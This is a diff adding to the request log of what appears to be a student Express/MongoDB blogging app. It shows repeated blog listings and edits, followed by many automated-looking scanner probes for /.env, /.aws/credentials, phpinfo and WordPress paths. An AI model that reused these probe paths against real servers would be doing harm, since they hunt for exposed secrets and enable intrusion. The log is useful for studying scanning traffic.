@@ -23900,3 +23900,2304 @@ Reading one blog { id: '66160d7bef57f83a3cd1bee1' }
 
 Mongoose connected to mongodb://blogs:blogs@localhost/blogs
 [0mGET /favicon.ico [36m304 [0m22.086 ms - -[0m
+Getting blogs list
+[0mGET /favicon.ico [36m304 [0m53.075 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: 'Hi im Dave yo',
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m113.981 ms - -[0m
+Reading one blog { id: '6615ebf575485b75f7a30ba1' }
+{
+  createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+  _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+  blogTitle: 'Dave is the Man',
+  blogText: 'Hi im Dave yo',
+  createdOn: 2024-04-10T01:31:33.770Z,
+  __v: 0
+}
+[0mGET /api/blogs/6615ebf575485b75f7a30ba1 [36m304 [0m10.008 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m3.795 ms - -[0m
+Reading one blog { id: '6615ebf575485b75f7a30ba1' }
+{
+  createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+  _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+  blogTitle: 'Dave is the Man',
+  blogText: 'Hi im Dave yo',
+  createdOn: 2024-04-10T01:31:33.770Z,
+  __v: 0
+}
+[0mGET /api/blogs/6615ebf575485b75f7a30ba1 [36m304 [0m5.089 ms - -[0m
+Updating a blog entry with id of 6615ebf575485b75f7a30ba1
+{
+  createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+  _id: '6615ebf575485b75f7a30ba1',
+  blogTitle: 'Dave is the Man',
+  blogText: "Hi im Dave yo. I'm the man.",
+  createdOn: '2024-04-10T01:31:33.770Z',
+  __v: 0
+}
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: 'Hi im Dave yo',
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m21.212 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m21.545 ms - -[0m
+[0mPUT /api/blogs/6615ebf575485b75f7a30ba1 [32m201 [0m78.002 ms - 194[0m
+Reading one blog { id: '6615ebf575485b75f7a30ba1' }
+{
+  createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+  _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+  blogTitle: 'Dave is the Man',
+  blogText: "Hi im Dave yo. I'm the man.",
+  createdOn: 2024-04-10T01:31:33.770Z,
+  __v: 0
+}
+[0mGET /api/blogs/6615ebf575485b75f7a30ba1 [32m200 [0m4.418 ms - 208[0m
+[0mGET /favicon.ico [36m304 [0m1.646 ms - -[0m
+Reading one blog { id: '6615ebf575485b75f7a30ba1' }
+{
+  createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+  _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+  blogTitle: 'Dave is the Man',
+  blogText: "Hi im Dave yo. I'm the man.",
+  createdOn: 2024-04-10T01:31:33.770Z,
+  __v: 0
+}
+[0mGET /api/blogs/6615ebf575485b75f7a30ba1 [36m304 [0m3.420 ms - -[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m4.693 ms - 1202[0m
+[0mGET /favicon.ico [36m304 [0m0.701 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.733 ms - -[0m
+[0mGET / [36m304 [0m1.298 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.485 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m2.839 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m1.073 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m1.437 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.637 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.953 ms - -[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m6.652 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.110 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.836 ms - -[0m
+[0mGET / [36m304 [0m0.507 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.376 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.374 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.869 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m1.525 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.523 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.716 ms - -[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m8.403 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.544 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.664 ms - -[0m
+[0mGET / [36m304 [0m1.002 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.592 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m0.988 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.610 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.544 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.670 ms - -[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m4.619 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.790 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.733 ms - -[0m
+[0mGET / [32m200 [0m4.763 ms - 6377[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.657 ms - 111[0m
+[0mGET /bloggerApp.js [32m200 [0m2.233 ms - 11732[0m
+[0mGET /css/fontawesome-all.css [32m200 [0m2.309 ms - 6377[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m2.655 ms - 232948[0m
+[0mGET /nav/navigation.html [32m200 [0m4.441 ms - 728[0m
+[0mGET /favicon.ico [32m200 [0m1.005 ms - 6377[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test',
+    blogText: 'Test',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m7.975 ms - 1202[0m
+[0mGET /favicon.ico [36m304 [0m0.686 ms - -[0m
+Reading one blog { id: '66160d7bef57f83a3cd1bee1' }
+{
+  createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+  _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+  blogTitle: 'Prof Test',
+  blogText: 'Test',
+  createdOn: 2024-04-10T03:54:35.410Z,
+  __v: 0
+}
+[0mGET /api/blogs/66160d7bef57f83a3cd1bee1 [32m200 [0m3.224 ms - 201[0m
+[0mGET /favicon.ico [36m304 [0m0.630 ms - -[0m
+Reading one blog { id: '66160d7bef57f83a3cd1bee1' }
+{
+  createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+  _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+  blogTitle: 'Prof Test',
+  blogText: 'Test',
+  createdOn: 2024-04-10T03:54:35.410Z,
+  __v: 0
+}
+[0mGET /api/blogs/66160d7bef57f83a3cd1bee1 [36m304 [0m3.414 ms - -[0m
+Updating a blog entry with id of 66160d7bef57f83a3cd1bee1
+{
+  createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+  _id: '66160d7bef57f83a3cd1bee1',
+  blogTitle: 'Prof Test!',
+  blogText: 'Test!',
+  createdOn: '2024-04-10T03:54:35.410Z',
+  __v: 0
+}
+[0mPUT /api/blogs/66160d7bef57f83a3cd1bee1 [32m201 [0m5.475 ms - 201[0m
+Getting blogs list
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test!',
+    blogText: 'Test!',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m5.603 ms - 1204[0m
+[0mGET /favicon.ico [36m304 [0m0.817 ms - -[0m
+[0mGET / [32m200 [0m1.005 ms - 6377[0m
+[0mGET / [32m200 [0m2.928 ms - 6377[0m
+[0mGET /.env [32m200 [0m8.614 ms - 6377[0m
+[0mPOST / [32m200 [0m32.280 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.966 ms - 6377[0m
+[0mPOST / [32m200 [0m1.232 ms - 6377[0m
+[0mGET / [32m200 [0m0.855 ms - 6377[0m
+[0mGET / [32m200 [0m0.766 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.847 ms - 6377[0m
+[0mPOST / [32m200 [0m1.312 ms - 6377[0m
+[0mGET / [32m200 [0m0.779 ms - 6377[0m
+[0mGET /.env [32m200 [0m6.528 ms - 6377[0m
+[0mPOST / [32m200 [0m1.175 ms - 6377[0m
+[0mGET / [32m200 [0m0.765 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.008 ms - 6377[0m
+[0mPOST / [32m200 [0m47.771 ms - 6377[0m
+[0mGET http://httpbin.org/ip [32m200 [0m1.704 ms - 6377[0m
+[0mGET / [32m200 [0m0.707 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.856 ms - 6377[0m
+[0mPOST / [32m200 [0m1.099 ms - 6377[0m
+[0mGET / [32m200 [0m0.996 ms - 6377[0m
+[0mGET / [32m200 [0m0.619 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.903 ms - 6377[0m
+[0mPOST / [32m200 [0m777.130 ms - 6377[0m
+[0mGET / [32m200 [0m1.062 ms - 6377[0m
+[0mGET /Temporary_Listen_Addresses [32m200 [0m1.823 ms - 6377[0m
+[0mGET /Pages/log/ [32m200 [0m1.139 ms - 6377[0m
+[0mGET / [32m200 [0m0.751 ms - 6377[0m
+[0mGET /.env [32m200 [0m2.617 ms - 6377[0m
+[0mPOST / [32m200 [0m3.219 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.785 ms - 6377[0m
+[0mPOST / [32m200 [0m1.127 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.776 ms - 6377[0m
+[0mPOST / [32m200 [0m0.899 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.779 ms - 6377[0m
+[0mGET / [32m200 [0m0.765 ms - 6377[0m
+[0mGET / [32m200 [0m0.671 ms - 6377[0m
+[0mGET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js [32m200 [0m0.998 ms - 6377[0m
+[0mGET / [32m200 [0m0.970 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.352 ms - 6377[0m
+[0mPOST / [32m200 [0m1.021 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.055 ms - 6377[0m
+[0mPOST / [32m200 [0m0.819 ms - 6377[0m
+[0mGET / [32m200 [0m0.684 ms - 6377[0m
+[0mGET / [32m200 [0m1.398 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.815 ms - 6377[0m
+[0mPOST / [32m200 [0m1.003 ms - 6377[0m
+[0mGET /hudson [32m200 [0m0.822 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.400 ms - 6377[0m
+[0mPOST / [32m200 [0m0.991 ms - 6377[0m
+[0mGET / [32m200 [0m1.169 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.116 ms - 6377[0m
+[0mPOST / [32m200 [0m107.357 ms - 6377[0m
+[0mGET / [32m200 [0m0.735 ms - 6377[0m
+[0mGET / [32m200 [0m0.751 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.887 ms - 6377[0m
+[0mGET /bloggerApp.js [32m200 [0m1.470 ms - 11732[0m
+[0mGET /sitemap.xml [32m200 [0m0.875 ms - 6377[0m
+[0mGET /robots.txt [32m200 [0m0.924 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.880 ms - 6377[0m
+[0mPOST /.env [32m200 [0m0.901 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m1.714 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m0.823 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m0.988 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m73.522 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m2.109 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m23.226 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.815 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m11.402 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.942 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m1.038 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m2.773 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m12.440 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.911 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m19.186 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.884 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m1.073 ms - 6377[0m
+[0mGET / [32m200 [0m0.985 ms - 6377[0m
+[0mGET / [32m200 [0m0.655 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.823 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.851 ms - 6377[0m
+[0mPOST / [32m200 [0m1.082 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.876 ms - 6377[0m
+[0mPOST / [32m200 [0m0.795 ms - 6377[0m
+[0mGET /portal/redlion [32m200 [0m0.917 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.044 ms - 6377[0m
+[0mPOST / [32m200 [0m305.378 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.780 ms - 6377[0m
+[0mPOST / [32m200 [0m0.786 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.935 ms - 6377[0m
+[0mPOST / [32m200 [0m0.815 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.862 ms - 6377[0m
+[0mPOST / [32m200 [0m0.806 ms - 6377[0m
+[0mGET / [32m200 [0m0.697 ms - 6377[0m
+[0mGET / [32m200 [0m0.739 ms - 6377[0m
+[0mGET / [32m200 [0m0.822 ms - 6377[0m
+[0mGET /wp-includes/wlwmanifest.xml [32m200 [0m0.913 ms - 6377[0m
+[0mGET /xmlrpc.php?rsd [32m200 [0m1.383 ms - 6377[0m
+[0mGET / [32m200 [0m0.739 ms - 6377[0m
+[0mGET /blog/wp-includes/wlwmanifest.xml [32m200 [0m2.747 ms - 6377[0m
+[0mGET /web/wp-includes/wlwmanifest.xml [32m200 [0m0.912 ms - 6377[0m
+[0mGET /wordpress/wp-includes/wlwmanifest.xml [32m200 [0m0.984 ms - 6377[0m
+[0mGET /website/wp-includes/wlwmanifest.xml [32m200 [0m0.945 ms - 6377[0m
+[0mGET /wp/wp-includes/wlwmanifest.xml [32m200 [0m0.985 ms - 6377[0m
+[0mGET /news/wp-includes/wlwmanifest.xml [32m200 [0m0.901 ms - 6377[0m
+[0mGET /wp1/wp-includes/wlwmanifest.xml [32m200 [0m0.913 ms - 6377[0m
+[0mGET /test/wp-includes/wlwmanifest.xml [32m200 [0m1.420 ms - 6377[0m
+[0mGET /wp2/wp-includes/wlwmanifest.xml [32m200 [0m1.753 ms - 6377[0m
+[0mGET /site/wp-includes/wlwmanifest.xml [32m200 [0m0.943 ms - 6377[0m
+[0mGET /cms/wp-includes/wlwmanifest.xml [32m200 [0m0.861 ms - 6377[0m
+[0mGET /sito/wp-includes/wlwmanifest.xml [32m200 [0m1.211 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.861 ms - 6377[0m
+[0mPOST / [32m200 [0m1.163 ms - 6377[0m
+[0mGET / [32m200 [0m0.768 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.960 ms - 6377[0m
+[0mGET /geoserver/web/ [32m200 [0m1.357 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.035 ms - 6377[0m
